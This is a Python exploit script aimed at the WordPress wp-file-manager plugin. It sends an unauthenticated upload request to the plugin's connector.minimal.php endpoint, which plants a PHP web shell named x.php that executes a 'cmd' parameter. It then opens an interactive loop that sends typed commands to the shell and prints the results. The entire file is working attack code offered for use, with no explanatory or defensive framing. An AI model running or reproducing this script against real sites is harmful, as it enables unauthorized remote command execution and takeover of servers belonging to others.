#!/usr/bin/python3

import requests
import sys

print("Usage: %s http://localhost" % sys.argv[0])

burp0_url = "%s/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" % sys.argv[1]
print(burp0_url)
burp0_headers = {"User-Agent": "curl/7.68.0", "Accept": "*/*", "Content-Type": "multipart/form-data; boundary=------------------------66e3ca93281c7050", "Expect": "100-continue", "Connection": "close"}
burp0_data = "--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"x.php\"\r\nContent-Type: image/png\r\n\r\n<?php system($_GET[\"cmd\"]); ?>\r\n--------------------------66e3ca93281c7050--\r\n"

print(requests.post(burp0_url, headers=burp0_headers, data=burp0_data))

print("URL Shell: %s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=<CMD>")
while True:

    cmd = input("$ ")
    if cmd == "exit":
        break
    burp0_url = "%s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=%s" % (sys.argv[1], cmd)
    burp0_headers = {"User-Agent": "curl/7.68.0", "Accept": "*/*", "Expect": "100-continue", "Connection": "close"}
    r = requests.get(burp0_url, headers=burp0_headers)
    print(r.text)
